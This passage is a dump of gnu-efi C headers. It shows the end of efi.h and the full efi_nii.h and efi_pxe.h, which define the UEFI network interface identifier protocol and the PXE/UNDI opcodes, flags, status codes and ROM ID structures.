#ifndef _GNU_EFI
#define _GNU_EFI
#endif

//
// Build flags on input
//  EFI32
//  EFI_DEBUG               - Enable debugging code
//  EFI_NT_EMULATOR         - Building for running under NT
//


#ifndef _EFI_INCLUDE_
#define _EFI_INCLUDE_

#define EFI_FIRMWARE_VENDOR         L"INTEL"
#define EFI_FIRMWARE_MAJOR_REVISION 12
#define EFI_FIRMWARE_MINOR_REVISION 33
#define EFI_FIRMWARE_REVISION ((EFI_FIRMWARE_MAJOR_REVISION <<16) | (EFI_FIRMWARE_MINOR_REVISION))

#if defined(_M_X64) || defined(__x86_64__) || defined(__amd64__)
#include "x86_64/efibind.h"
#elif defined(_M_IX86) || defined(__i386__)
#include "ia32/efibind.h"
#elif defined(_M_IA64) || defined(__ia64__)
#include "ia64/efibind.h"
#elif defined (_M_ARM64) || defined(__aarch64__)
#include "aarch64/efibind.h"
#elif defined (_M_ARM) || defined(__arm__)
#include "arm/efibind.h"
#elif defined (_M_MIPS64) || defined(__mips64__)
#include "mips64el/efibind.h"
#elif defined (__riscv) && __riscv_xlen == 64
#include "riscv64/efibind.h"
#else
#error Usupported architecture
#endif

#include "eficompiler.h"
#include "efidef.h"
#include "efidevp.h"
#include "efipciio.h"
#include "efiprot.h"
#include "eficon.h"
#include "eficonex.h"
#include "efiser.h"
#include "efi_nii.h"
#include "efipxebc.h"
#include "efinet.h"
#include "efiapi.h"
#include "efifs.h"
#include "efierr.h"
#include "efiui.h"
#include "efiip.h"
#include "efiudp.h"
#include "efitcp.h"
#include "efipoint.h"
#include "efishell.h"

#endif

```

`include/gnu-efi/efi_nii.h`:

```h
#ifndef _EFI_NII_H
#define _EFI_NII_H

/*++
Copyright (c) 2000  Intel Corporation

Module name:
    efi_nii.h

Abstract:

Revision history:
    2000-Feb-18 M(f)J   GUID updated.
                Structure order changed for machine word alignment.
                Added StringId[4] to structure.

    2000-Feb-14 M(f)J   Genesis.
--*/

#define EFI_NETWORK_INTERFACE_IDENTIFIER_PROTOCOL_GUID \
    { 0xE18541CD, 0xF755, 0x4f73, {0x92, 0x8D, 0x64, 0x3C, 0x8A, 0x79, 0xB2, 0x29} }

#define EFI_NETWORK_INTERFACE_IDENTIFIER_PROTOCOL_REVISION  0x00010000
#define EFI_NETWORK_INTERFACE_IDENTIFIER_INTERFACE_REVISION EFI_NETWORK_INTERFACE_IDENTIFIER_PROTOCOL_REVISION

typedef enum {
    EfiNetworkInterfaceUndi = 1
} EFI_NETWORK_INTERFACE_TYPE;

typedef struct _EFI_NETWORK_INTERFACE_IDENTIFIER_PROTOCOL {

    UINT64 Revision;
    // Revision of the network interface identifier protocol interface.

    UINT64 ID;
    // Address of the first byte of the identifying structure for this
    // network interface.  This is set to zero if there is no structure.
    //
    // For PXE/UNDI this is the first byte of the !PXE structure.

    UINT64 ImageAddr;
    // Address of the UNrelocated driver/ROM image.  This is set
    // to zero if there is no driver/ROM image.
    //
    // For 16-bit UNDI, this is the first byte of the option ROM in
    // upper memory.
    //
    // For 32/64-bit S/W UNDI, this is the first byte of the EFI ROM
    // image.
    //
    // For H/W UNDI, this is set to zero.

    UINT32 ImageSize;
    // Size of the UNrelocated driver/ROM image of this network interface.
    // This is set to zero if there is no driver/ROM image.

    CHAR8 StringId[4];
    // 4 char ASCII string to go in class identifier (option 60) in DHCP
    // and Boot Server discover packets.
    // For EfiNetworkInterfaceUndi this field is "UNDI".
    // For EfiNetworkInterfaceSnp this field is "SNPN".

    UINT8 Type;
    UINT8 MajorVer;
    UINT8 MinorVer;
    // Information to be placed into the PXE DHCP and Discover packets.
    // This is the network interface type and version number that will
    // be placed into DHCP option 94 (client network interface identifier).
    BOOLEAN Ipv6Supported;
    UINT8   IfNum;	// interface number to be used with pxeid structure
} EFI_NETWORK_INTERFACE_IDENTIFIER_PROTOCOL, EFI_NETWORK_INTERFACE_IDENTIFIER_INTERFACE;

// Note: Because it conflicted with the EDK2 struct name, the
// 'EFI_NETWORK_INTERFACE_IDENTIFIER_PROTOCOL' GUID definition,
// from older versions of gnu-efi, is now obsoleted.
// Use 'EFI_NETWORK_INTERFACE_IDENTIFIER_PROTOCOL_GUID' instead.

#endif // _EFI_NII_H

```

`include/gnu-efi/efi_pxe.h`:

```h
#ifndef _EFI_PXE_H
#define _EFI_PXE_H


/*++
Copyright (c) Intel  1999

Module name:
    efi_pxe.h

32/64-bit PXE specification:
    alpha-4, 99-Dec-17

Abstract:
    This header file contains all of the PXE type definitions,
    structure prototypes, global variables and constants that
    are needed for porting PXE to EFI.
--*/

#pragma pack(1)

#define PXE_INTEL_ORDER         1   // Intel order
//#define PXE_NETWORK_ORDER         1   // network order

#define PXE_UINT64_SUPPORT          1   // UINT64 supported
//#define PXE_NO_UINT64_SUPPORT     1   // UINT64 not supported

#define PXE_BUSTYPE(a,b,c,d)            \
((((PXE_UINT32)(d) & 0xFF) << 24) | \
(((PXE_UINT32)(c) & 0xFF) << 16) |  \
(((PXE_UINT32)(b) & 0xFF) << 8) |       \
((PXE_UINT32)(a) & 0xFF))

//
// UNDI ROM ID and devive ID signature
//
#define PXE_BUSTYPE_PXE         PXE_BUSTYPE('!', 'P', 'X', 'E')

//
// BUS ROM ID signatures
//
#define PXE_BUSTYPE_PCI         PXE_BUSTYPE('P', 'C', 'I', 'R')
#define PXE_BUSTYPE_PC_CARD     PXE_BUSTYPE('P', 'C', 'C', 'R')
#define PXE_BUSTYPE_USB         PXE_BUSTYPE('U', 'S', 'B', 'R')
#define PXE_BUSTYPE_1394        PXE_BUSTYPE('1', '3', '9', '4')

#define PXE_SWAP_UINT16(n)          \
((((PXE_UINT16)(n) & 0x00FF) << 8) |    \
(((PXE_UINT16)(n) & 0xFF00) >> 8))

#define PXE_SWAP_UINT32(n)              \
((((PXE_UINT32)(n) & 0x000000FF) << 24) |   \
(((PXE_UINT32)(n) & 0x0000FF00) << 8) |     \
(((PXE_UINT32)(n) & 0x00FF0000) >> 8) |     \
(((PXE_UINT32)(n) & 0xFF000000) >> 24))

#if PXE_UINT64_SUPPORT != 0
#define PXE_SWAP_UINT64(n)                  \
((((PXE_UINT64)(n) & 0x00000000000000FF) << 56) |   \
(((PXE_UINT64)(n) & 0x000000000000FF00) << 40) |    \
(((PXE_UINT64)(n) & 0x0000000000FF0000) << 24) |    \
(((PXE_UINT64)(n) & 0x00000000FF000000) << 8) | \
(((PXE_UINT64)(n) & 0x000000FF00000000) >> 8) | \
(((PXE_UINT64)(n) & 0x0000FF0000000000) >> 24) |    \
(((PXE_UINT64)(n) & 0x00FF000000000000) >> 40) |    \
(((PXE_UINT64)(n) & 0xFF00000000000000) >> 56))
#endif // PXE_UINT64_SUPPORT

#if PXE_NO_UINT64_SUPPORT != 0
#define PXE_SWAP_UINT64(n)                      \
{                                       \
PXE_UINT32 tmp = (PXE_UINT64)(n)[1];                \
(PXE_UINT64)(n)[1] = PXE_SWAP_UINT32((PXE_UINT64)(n)[0]);   \
(PXE_UINT64)(n)[0] = tmp;                       \
}
#endif // PXE_NO_UINT64_SUPPORT

#define PXE_CPBSIZE_NOT_USED            0   // zero
#define PXE_DBSIZE_NOT_USED         0   // zero
#define PXE_CPBADDR_NOT_USED        (PXE_UINT64)0       // zero
#define PXE_DBADDR_NOT_USED     (PXE_UINT64)0       // zero

#define PXE_CONST const

#define PXE_VOLATILE volatile

typedef void PXE_VOID;

typedef unsigned char PXE_UINT8;

typedef unsigned short PXE_UINT16;

typedef unsigned PXE_UINT32;

#if PXE_UINT64_SUPPORT != 0
// typedef unsigned long PXE_UINT64;
typedef UINT64 PXE_UINT64;
#endif // PXE_UINT64_SUPPORT

#if PXE_NO_UINT64_SUPPORT != 0
typedef PXE_UINT32 PXE_UINT64[2];
#endif // PXE_NO_UINT64_SUPPORT

typedef unsigned PXE_UINTN;

typedef PXE_UINT8 PXE_BOOL;

#define PXE_FALSE               0   // zero
#define PXE_TRUE                    (!PXE_FALSE)

typedef PXE_UINT16 PXE_OPCODE;

//
// Return UNDI operational state.
//
#define PXE_OPCODE_GET_STATE                    0x0000

//
// Change UNDI operational state from Stopped to Started.
//
#define PXE_OPCODE_START                    0x0001

//
// Change UNDI operational state from Started to Stopped.
//
#define PXE_OPCODE_STOP                     0x0002

//
// Get UNDI initialization information.
//
#define PXE_OPCODE_GET_INIT_INFO                0x0003

//
// Get NIC configuration information.
//
#define PXE_OPCODE_GET_CONFIG_INFO              0x0004

//
// Changed UNDI operational state from Started to Initialized.
//
#define PXE_OPCODE_INITIALIZE                   0x0005

//
// Re-initialize the NIC H/W.
//
#define PXE_OPCODE_RESET                    0x0006

//
// Change the UNDI operational state from Initialized to Started.
//
#define PXE_OPCODE_SHUTDOWN                 0x0007

//
// Read & change state of external interrupt enables.
//
#define PXE_OPCODE_INTERRUPT_ENABLES                0x0008

//
// Read & change state of packet receive filters.
//
#define PXE_OPCODE_RECEIVE_FILTERS              0x0009

//
// Read & change station MAC address.
//
#define PXE_OPCODE_STATION_ADDRESS              0x000A

//
// Read traffic statistics.
//
#define PXE_OPCODE_STATISTICS                   0x000B

//
// Convert multicast IP address to multicast MAC address.
//
#define PXE_OPCODE_MCAST_IP_TO_MAC              0x000C

//
// Read or change non-volatile storage on the NIC.
//
#define PXE_OPCODE_NVDATA                   0x000D

//
// Get & clear interrupt status.
//
#define PXE_OPCODE_GET_STATUS                   0x000E

//
// Fill media header in packet for transmit.
//
#define PXE_OPCODE_FILL_HEADER              0x000F

//
// Transmit packet(s).
//
#define PXE_OPCODE_TRANSMIT                 0x0010

//
// Receive packet.
//
#define PXE_OPCODE_RECEIVE                  0x0011

// last valid opcode:
#define PXE_OPCODE_VALID_MAX                    0x0011

//
// Last valid PXE UNDI OpCode number.
//
#define PXE_OPCODE_LAST_VALID                   0x0011

typedef PXE_UINT16 PXE_OPFLAGS;

#define PXE_OPFLAGS_NOT_USED                    0x0000

////////////////////////////////////////
// UNDI Get State
//

// No OpFlags

////////////////////////////////////////
// UNDI Start
//

// No OpFlags

////////////////////////////////////////
// UNDI Stop
//

// No OpFlags

////////////////////////////////////////
// UNDI Get Init Info
//

// No Opflags

////////////////////////////////////////
// UNDI Get Config Info
//

// No Opflags

////////////////////////////////////////
// UNDI Initialize
//

#define PXE_OPFLAGS_INITIALIZE_CABLE_DETECT_MASK    0x0001
#define PXE_OPFLAGS_INITIALIZE_DETECT_CABLE         0x0000
#define PXE_OPFLAGS_INITIALIZE_DO_NOT_DETECT_CABLE  0x0001

////////////////////////////////////////
// UNDI Reset
//

#define PXE_OPFLAGS_RESET_DISABLE_INTERRUPTS        0x0001
#define PXE_OPFLAGS_RESET_DISABLE_FILTERS           0x0002

////////////////////////////////////////
// UNDI Shutdown
//

// No OpFlags

////////////////////////////////////////
// UNDI Interrupt Enables
//

//
// Select whether to enable or disable external interrupt signals.
// Setting both enable and disable will return PXE_STATCODE_INVALID_OPFLAGS.
//
#define PXE_OPFLAGS_INTERRUPT_OPMASK                0xC000
#define PXE_OPFLAGS_INTERRUPT_ENABLE                0x8000
#define PXE_OPFLAGS_INTERRUPT_DISABLE           0x4000
#define PXE_OPFLAGS_INTERRUPT_READ              0x0000

//
// Enable receive interrupts.  An external interrupt will be generated
// after a complete non-error packet has been received.
//
#define PXE_OPFLAGS_INTERRUPT_RECEIVE           0x0001

//
// Enable transmit interrupts.  An external interrupt will be generated
// after a complete non-error packet has been transmitted.
//
#define PXE_OPFLAGS_INTERRUPT_TRANSMIT          0x0002

//
// Enable command interrupts.  An external interrupt will be generated
// when command execution stops.
//
#define PXE_OPFLAGS_INTERRUPT_COMMAND           0x0004

//
// Generate software interrupt.  Setting this bit generates an external
// interrupt, if it is supported by the hardware.
//
#define PXE_OPFLAGS_INTERRUPT_SOFTWARE          0x0008

////////////////////////////////////////
// UNDI Receive Filters
//

//
// Select whether to enable or disable receive filters.
// Setting both enable and disable will return PXE_STATCODE_INVALID_OPCODE.
//
#define PXE_OPFLAGS_RECEIVE_FILTER_OPMASK           0xC000
#define PXE_OPFLAGS_RECEIVE_FILTER_ENABLE           0x8000
#define PXE_OPFLAGS_RECEIVE_FILTER_DISABLE          0x4000
#define PXE_OPFLAGS_RECEIVE_FILTER_READ         0x0000

//
// To reset the contents of the multicast MAC address filter list,
// set this OpFlag:
//
#define PXE_OPFLAGS_RECEIVE_FILTER_RESET_MCAST_LIST 0x2000

//
// Enable unicast packet receiving.  Packets sent to the current station
// MAC address will be received.
//
#define PXE_OPFLAGS_RECEIVE_FILTER_UNICAST          0x0001

//
// Enable broadcast packet receiving.  Packets sent to the broadcast 
// MAC address will be received.
//
#define PXE_OPFLAGS_RECEIVE_FILTER_BROADCAST        0x0002

//
// Enable filtered multicast packet receiving.  Packets sent to any
// of the multicast MAC addresses in the multicast MAC address filter
// list will be received.  If the filter list is empty, no multicast
//
#define PXE_OPFLAGS_RECEIVE_FILTER_FILTERED_MULTICAST   0x0004

//
// Enable promiscuous packet receiving.  All packets will be received.
//
#define PXE_OPFLAGS_RECEIVE_FILTER_PROMISCUOUS      0x0008

//
// Enable promiscuous multicast packet receiving.  All multicast
// packets will be received.
//
#define PXE_OPFLAGS_RECEIVE_FILTER_ALL_MULTICAST        0x0010

////////////////////////////////////////
// UNDI Station Address
//

#define PXE_OPFLAGS_STATION_ADDRESS_READ            0x0000
#define PXE_OPFLAGS_STATION_ADDRESS_RESET           0x0001

////////////////////////////////////////
// UNDI Statistics
//

#define PXE_OPFLAGS_STATISTICS_READ             0x0000
#define PXE_OPFLAGS_STATISTICS_RESET                0x0001

////////////////////////////////////////
// UNDI MCast IP to MAC
//

//
// Identify the type of IP address in the CPB.
//
#define PXE_OPFLAGS_MCAST_IP_TO_MAC_OPMASK          0x0003
#define PXE_OPFLAGS_MCAST_IPV4_TO_MAC           0x0000
#define PXE_OPFLAGS_MCAST_IPV6_TO_MAC           0x0001

////////////////////////////////////////
// UNDI NvData
//

//
// Select the type of non-volatile data operation.
//
#define PXE_OPFLAGS_NVDATA_OPMASK               0x0001
#define PXE_OPFLAGS_NVDATA_READ             0x0000
#define PXE_OPFLAGS_NVDATA_WRITE                0x0001

////////////////////////////////////////
// UNDI Get Status
//

//
// Return current interrupt status.  This will also clear any interrupts
// that are currently set.  This can be used in a polling routine.  The
// interrupt flags are still set and cleared even when the interrupts
// are disabled.
//
#define PXE_OPFLAGS_GET_INTERRUPT_STATUS            0x0001

//
// Return list of transmitted buffers for recycling.  Transmit buffers
// must not be changed or unallocated until they have recycled.  After
// issuing a transmit command, wait for a transmit complete interrupt.
// When a transmit complete interrupt is received, read the transmitted
// buffers.  Do not plan on getting one buffer per interrupt.  Some
// NICs and UNDIs may transmit multiple buffers per interrupt.
//
#define PXE_OPFLAGS_GET_TRANSMITTED_BUFFERS         0x0002

////////////////////////////////////////
// UNDI Fill Header
//

#define PXE_OPFLAGS_FILL_HEADER_OPMASK          0x0001
#define PXE_OPFLAGS_FILL_HEADER_FRAGMENTED          0x0001
#define PXE_OPFLAGS_FILL_HEADER_WHOLE           0x0000

////////////////////////////////////////
// UNDI Transmit
//

//
// S/W UNDI only.  Return after the packet has been transmitted.  A
// transmit complete interrupt will still be generated and the transmit
// buffer will have to be recycled.
//
#define PXE_OPFLAGS_SWUNDI_TRANSMIT_OPMASK          0x0001
#define PXE_OPFLAGS_TRANSMIT_BLOCK              0x0001
#define PXE_OPFLAGS_TRANSMIT_DONT_BLOCK         0x0000

//
//
//
#define PXE_OPFLAGS_TRANSMIT_OPMASK             0x0002
#define PXE_OPFLAGS_TRANSMIT_FRAGMENTED         0x0002
#define PXE_OPFLAGS_TRANSMIT_WHOLE              0x0000

////////////////////////////////////////
// UNDI Receive
//

// No OpFlags

typedef PXE_UINT16 PXE_STATFLAGS;

#define PXE_STATFLAGS_INITIALIZE                0x0000

////////////////////////////////////////
// Common StatFlags that can be returned by all commands.
//

//
// The COMMAND_COMPLETE and COMMAND_FAILED status flags must be
// implemented by all UNDIs.  COMMAND_QUEUED is only needed by UNDIs
// that support command queuing.
//
#define PXE_STATFLAGS_STATUS_MASK               0xC000
#define PXE_STATFLAGS_COMMAND_COMPLETE          0xC000
#define PXE_STATFLAGS_COMMAND_FAILED                0x8000
#define PXE_STATFLAGS_COMMAND_QUEUED                0x4000
//#define PXE_STATFLAGS_INITIALIZE              0x0000

#define PXE_STATFLAGS_DB_WRITE_TRUNCATED            0x2000

////////////////////////////////////////
// UNDI Get State
//

#define PXE_STATFLAGS_GET_STATE_MASK                0x0003
#define PXE_STATFLAGS_GET_STATE_INITIALIZED         0x0002
#define PXE_STATFLAGS_GET_STATE_STARTED         0x0001
#define PXE_STATFLAGS_GET_STATE_STOPPED         0x0000

////////////////////////////////////////
// UNDI Start
//

// No additional StatFlags

////////////////////////////////////////
// UNDI Get Init Info
//

#define PXE_STATFLAGS_CABLE_DETECT_MASK          0x0001
#define PXE_STATFLAGS_CABLE_DETECT_NOT_SUPPORTED 0x0000
#define PXE_STATFLAGS_CABLE_DETECT_SUPPORTED     0x0001


////////////////////////////////////////
// UNDI Initialize
//

#define PXE_STATFLAGS_INITIALIZED_NO_MEDIA          0x0001

////////////////////////////////////////
// UNDI Reset
//

#define PXE_STATFLAGS_RESET_NO_MEDIA                0x0001

////////////////////////////////////////
// UNDI Shutdown
//

// No additional StatFlags

////////////////////////////////////////
// UNDI Interrupt Enables
//

//
// If set, receive interrupts are enabled.
//
#define PXE_STATFLAGS_INTERRUPT_RECEIVE         0x0001

//
// If set, transmit interrupts are enabled.
//
#define PXE_STATFLAGS_INTERRUPT_TRANSMIT            0x0002

//
// If set, command interrupts are enabled.
//
#define PXE_STATFLAGS_INTERRUPT_COMMAND         0x0004


////////////////////////////////////////
// UNDI Receive Filters
//

//
// If set, unicast packets will be received.
//
#define PXE_STATFLAGS_RECEIVE_FILTER_UNICAST        0x0001

//
// If set, broadcast packets will be received.
//
#define PXE_STATFLAGS_RECEIVE_FILTER_BROADCAST      0x0002

//
// If set, multicast packets that match up with the multicast address
// filter list will be received.
//
#define PXE_STATFLAGS_RECEIVE_FILTER_FILTERED_MULTICAST 0x0004

//
// If set, all packets will be received.
//
#define PXE_STATFLAGS_RECEIVE_FILTER_PROMISCUOUS        0x0008

//
// If set, all multicast packets will be received.
//
#define PXE_STATFLAGS_RECEIVE_FILTER_ALL_MULTICAST  0x0010

////////////////////////////////////////
// UNDI Station Address
//

// No additional StatFlags

////////////////////////////////////////
// UNDI Statistics
//

// No additional StatFlags

////////////////////////////////////////
// UNDI MCast IP to MAC
//

// No additional StatFlags

////////////////////////////////////////
// UNDI NvData
//

// No additional StatFlags


////////////////////////////////////////
// UNDI Get Status
//

//
// Use to determine if an interrupt has occurred.
//
#define PXE_STATFLAGS_GET_STATUS_INTERRUPT_MASK     0x000F
#define PXE_STATFLAGS_GET_STATUS_NO_INTERRUPTS      0x0000

//
// If set, at least one receive interrupt occurred.
//
#define PXE_STATFLAGS_GET_STATUS_RECEIVE            0x0001

//
// If set, at least one transmit interrupt occurred.
//
#define PXE_STATFLAGS_GET_STATUS_TRANSMIT           0x0002

//
// If set, at least one command interrupt occurred.
//
#define PXE_STATFLAGS_GET_STATUS_COMMAND            0x0004

//
// If set, at least one software interrupt occurred.
//
#define PXE_STATFLAGS_GET_STATUS_SOFTWARE           0x0008

//
// This flag is set if the transmitted buffer queue is empty.  This flag
// will be set if all transmitted buffer addresses get written into the DB.
//
#define PXE_STATFLAGS_GET_STATUS_TXBUF_QUEUE_EMPTY  0x0010

//
// This flag is set if no transmitted buffer addresses were written
// into the DB.  (This could be because DBsize was too small.)
//
#define PXE_STATFLAGS_GET_STATUS_NO_TXBUFS_WRITTEN  0x0020

////////////////////////////////////////
// UNDI Fill Header
//

// No additional StatFlags

////////////////////////////////////////
// UNDI Transmit
//

// No additional StatFlags.

////////////////////////////////////////
// UNDI Receive
//

// No additional StatFlags.

typedef PXE_UINT16 PXE_STATCODE;

#define PXE_STATCODE_INITIALIZE             0x0000

////////////////////////////////////////
// Common StatCodes returned by all UNDI commands, UNDI protocol functions
// and BC protocol functions.
//

#define PXE_STATCODE_SUCCESS                    0x0000

#define PXE_STATCODE_INVALID_CDB                0x0001
#define PXE_STATCODE_INVALID_CPB                0x0002
#define PXE_STATCODE_BUSY                   	0x0003
#define PXE_STATCODE_QUEUE_FULL             	0x0004
#define PXE_STATCODE_ALREADY_STARTED            0x0005
#define PXE_STATCODE_NOT_STARTED                0x0006
#define PXE_STATCODE_NOT_SHUTDOWN               0x0007
#define PXE_STATCODE_ALREADY_INITIALIZED        0x0008
#define PXE_STATCODE_NOT_INITIALIZED            0x0009
#define PXE_STATCODE_DEVICE_FAILURE             0x000A
#define PXE_STATCODE_NVDATA_FAILURE             0x000B
#define PXE_STATCODE_UNSUPPORTED                0x000C
#define PXE_STATCODE_BUFFER_FULL                0x000D
#define PXE_STATCODE_INVALID_PARAMETER		0x000E
#define PXE_STATCODE_INVALID_UNDI		0x000F
#define PXE_STATCODE_IPV4_NOT_SUPPORTED		0x0010
#define PXE_STATCODE_IPV6_NOT_SUPPORTED		0x0011
#define PXE_STATCODE_NOT_ENOUGH_MEMORY		0x0012
#define PXE_STATCODE_NO_DATA			0x0013


typedef PXE_UINT16 PXE_IFNUM;

//
// This interface number must be passed to the S/W UNDI Start command.
//
#define PXE_IFNUM_START                     0x0000

//
// This interface number is returned by the S/W UNDI Get State and
// Start commands if information in the CDB, CPB or DB is invalid.
//
#define PXE_IFNUM_INVALID                   0x0000

typedef PXE_UINT16 PXE_CONTROL;

//
// Setting this flag directs the UNDI to queue this command for later
// execution if the UNDI is busy and it supports command queuing.
// If queuing is not supported, a PXE_STATCODE_INVALID_CONTROL error
// is returned.  If the queue is full, a PXE_STATCODE_CDB_QUEUE_FULL 
// error is returned.
//
#define PXE_CONTROL_QUEUE_IF_BUSY               0x0002

//
// These two bit values are used to determine if there are more UNDI
// CDB structures following this one.  If the link bit is set, there
// must be a CDB structure following this one.  Execution will start
// on the next CDB structure as soon as this one completes successfully.
// If an error is generated by this command, execution will stop.
//
#define PXE_CONTROL_LINK                    0x0001
#define PXE_CONTROL_LAST_CDB_IN_LIST                0x0000

typedef PXE_UINT8 PXE_FRAME_TYPE;

#define PXE_FRAME_TYPE_NONE                 0x00
#define PXE_FRAME_TYPE_UNICAST              0x01
#define PXE_FRAME_TYPE_BROADCAST                0x02
#define PXE_FRAME_TYPE_MULTICAST            0x03
#define PXE_FRAME_TYPE_PROMISCUOUS              0x04

typedef PXE_UINT32 PXE_IPV4;

typedef PXE_UINT32 PXE_IPV6[4];
#define PXE_MAC_LENGTH 32

typedef PXE_UINT8 PXE_MAC_ADDR[PXE_MAC_LENGTH];

typedef PXE_UINT8 PXE_IFTYPE;
typedef PXE_UINT16 PXE_MEDIA_PROTOCOL;

//
// This information is from the ARP section of RFC 1700.
//
//     1 Ethernet (10Mb)                                    [JBP]
//     2 Experimental Ethernet (3Mb)                        [JBP]
//     3 Amateur Radio AX.25                                [PXK]
//     4 Proteon ProNET Token Ring                          [JBP]
//     5 Chaos                                              [GXP]
//     6 IEEE 802 Networks                                  [JBP]
//     7 ARCNET                                             [JBP]
//     8 Hyperchannel                                       [JBP]
//     9 Lanstar                                             [TU]
//    10 Autonet Short Address                             [MXB1]
//    11 LocalTalk                                         [JKR1]
//    12 LocalNet (IBM PCNet or SYTEK LocalNET)             [JXM]
//    13 Ultra link                                        [RXD2]
//    14 SMDS                                              [GXC1]
//    15 Frame Relay                                        [AGM]
//    16 Asynchronous Transmission Mode (ATM)              [JXB2]
//    17 HDLC                                               [JBP]
//    18 Fibre Channel                            [Yakov Rekhter]
//    19 Asynchronous Transmission Mode (ATM)      [Mark Laubach]
//    20 Serial Line                                        [JBP]
//    21 Asynchronous Transmission Mode (ATM)              [MXB1]
//

#define PXE_IFTYPE_ETHERNET                 0x01
#define PXE_IFTYPE_TOKENRING                    0x04
#define PXE_IFTYPE_FIBRE_CHANNEL                0x12

typedef struct s_pxe_hw_undi {
PXE_UINT32 Signature;       // PXE_ROMID_SIGNATURE
PXE_UINT8 Len;          // sizeof(PXE_HW_UNDI)
PXE_UINT8 Fudge;            // makes 8-bit cksum equal zero
PXE_UINT8 Rev;          // PXE_ROMID_REV
PXE_UINT8 IFcnt;            // physical connector count
PXE_UINT8 MajorVer;         // PXE_ROMID_MAJORVER
PXE_UINT8 MinorVer;         // PXE_ROMID_MINORVER
PXE_UINT16 reserved;        // zero, not used
PXE_UINT32 Implementation;      // implementation flags
// reserved             // vendor use
// PXE_UINT32 Status;       // status port
// PXE_UINT32 Command;      // command port
// PXE_UINT64 CDBaddr;      // CDB address port
} PXE_HW_UNDI;

//
// Status port bit definitions
//

//
// UNDI operation state
//
#define PXE_HWSTAT_STATE_MASK                   0xC0000000
#define PXE_HWSTAT_BUSY                     0xC0000000
#define PXE_HWSTAT_INITIALIZED              0x80000000
#define PXE_HWSTAT_STARTED                  0x40000000
#define PXE_HWSTAT_STOPPED                  0x00000000

//
// If set, last command failed
//
#define PXE_HWSTAT_COMMAND_FAILED               0x20000000

//
// If set, identifies enabled receive filters
//
#define PXE_HWSTAT_PROMISCUOUS_MULTICAST_RX_ENABLED 0x00001000
#define PXE_HWSTAT_PROMISCUOUS_RX_ENABLED           0x00000800
#define PXE_HWSTAT_BROADCAST_RX_ENABLED         0x00000400
#define PXE_HWSTAT_MULTICAST_RX_ENABLED         0x00000200
#define PXE_HWSTAT_UNICAST_RX_ENABLED           0x00000100

//
// If set, identifies enabled external interrupts
//
#define PXE_HWSTAT_SOFTWARE_INT_ENABLED         0x00000080
#define PXE_HWSTAT_TX_COMPLETE_INT_ENABLED          0x00000040
#define PXE_HWSTAT_PACKET_RX_INT_ENABLED            0x00000020
#define PXE_HWSTAT_CMD_COMPLETE_INT_ENABLED         0x00000010

//
// If set, identifies pending interrupts
//
#define PXE_HWSTAT_SOFTWARE_INT_PENDING         0x00000008
#define PXE_HWSTAT_TX_COMPLETE_INT_PENDING          0x00000004
#define PXE_HWSTAT_PACKET_RX_INT_PENDING            0x00000002
#define PXE_HWSTAT_CMD_COMPLETE_INT_PENDING         0x00000001

//
// Command port definitions
//

//
// If set, CDB identified in CDBaddr port is given to UNDI.
// If not set, other bits in this word will be processed.
//
#define PXE_HWCMD_ISSUE_COMMAND             0x80000000
#define PXE_HWCMD_INTS_AND_FILTS                0x00000000

//
// Use these to enable/disable receive filters.
//
#define PXE_HWCMD_PROMISCUOUS_MULTICAST_RX_ENABLE       0x00001000
#define PXE_HWCMD_PROMISCUOUS_RX_ENABLE         0x00000800
#define PXE_HWCMD_BROADCAST_RX_ENABLE           0x00000400
#define PXE_HWCMD_MULTICAST_RX_ENABLE           0x00000200
#define PXE_HWCMD_UNICAST_RX_ENABLE             0x00000100

//
// Use these to enable/disable external interrupts
//
#define PXE_HWCMD_SOFTWARE_INT_ENABLE           0x00000080
#define PXE_HWCMD_TX_COMPLETE_INT_ENABLE            0x00000040
#define PXE_HWCMD_PACKET_RX_INT_ENABLE          0x00000020
#define PXE_HWCMD_CMD_COMPLETE_INT_ENABLE           0x00000010

//
// Use these to clear pending external interrupts
//
#define PXE_HWCMD_CLEAR_SOFTWARE_INT                0x00000008
#define PXE_HWCMD_CLEAR_TX_COMPLETE_INT         0x00000004
#define PXE_HWCMD_CLEAR_PACKET_RX_INT           0x00000002
#define PXE_HWCMD_CLEAR_CMD_COMPLETE_INT            0x00000001

typedef struct s_pxe_sw_undi {
PXE_UINT32 Signature;       // PXE_ROMID_SIGNATURE
PXE_UINT8 Len;          // sizeof(PXE_SW_UNDI)
PXE_UINT8 Fudge;            // makes 8-bit cksum zero
PXE_UINT8 Rev;          // PXE_ROMID_REV
PXE_UINT8 IFcnt;            // physical connector count
PXE_UINT8 MajorVer;         // PXE_ROMID_MAJORVER
PXE_UINT8 MinorVer;         // PXE_ROMID_MINORVER
PXE_UINT16 reserved1;       // zero, not used
PXE_UINT32 Implementation;      // Implementation flags
PXE_UINT64 EntryPoint;      // API entry point
PXE_UINT8 reserved2[3];     // zero, not used
PXE_UINT8 BusCnt;           // number of bustypes supported
PXE_UINT32 BusType[1];      // list of supported bustypes
} PXE_SW_UNDI;

typedef union u_pxe_undi {
PXE_HW_UNDI hw;
PXE_SW_UNDI sw;
} PXE_UNDI;

//
// Signature of !PXE structure
//
#define PXE_ROMID_SIGNATURE     PXE_BUSTYPE('!', 'P', 'X', 'E')

//
// !PXE structure format revision
//
#define PXE_ROMID_REV                       0x02

//
// UNDI command interface revision.  These are the values that get sent
// in option 94 (Client Network Interface Identifier) in the DHCP Discover
// and PXE Boot Server Request packets.
//
#define PXE_ROMID_MAJORVER                  0x03
#define PXE_ROMID_MINORVER                  0x00

//
// Implementation flags
//
#define PXE_ROMID_IMP_HW_UNDI                   0x80000000
#define PXE_ROMID_IMP_SW_VIRT_ADDR              0x40000000
#define PXE_ROMID_IMP_64BIT_DEVICE              0x00010000
#define PXE_ROMID_IMP_FRAG_SUPPORTED                0x00008000
#define PXE_ROMID_IMP_CMD_LINK_SUPPORTED            0x00004000
#define PXE_ROMID_IMP_CMD_QUEUE_SUPPORTED           0x00002000
#define PXE_ROMID_IMP_MULTI_FRAME_SUPPORTED         0x00001000
#define PXE_ROMID_IMP_NVDATA_SUPPORT_MASK           0x00000C00
#define PXE_ROMID_IMP_NVDATA_BULK_WRITABLE          0x00000C00
#define PXE_ROMID_IMP_NVDATA_SPARSE_WRITABLE        0x00000800
#define PXE_ROMID_IMP_NVDATA_READ_ONLY          0x00000400
#define PXE_ROMID_IMP_NVDATA_NOT_AVAILABLE          0x00000000
#define PXE_ROMID_IMP_STATISTICS_SUPPORTED          0x00000200
#define PXE_ROMID_IMP_STATION_ADDR_SETTABLE         0x00000100
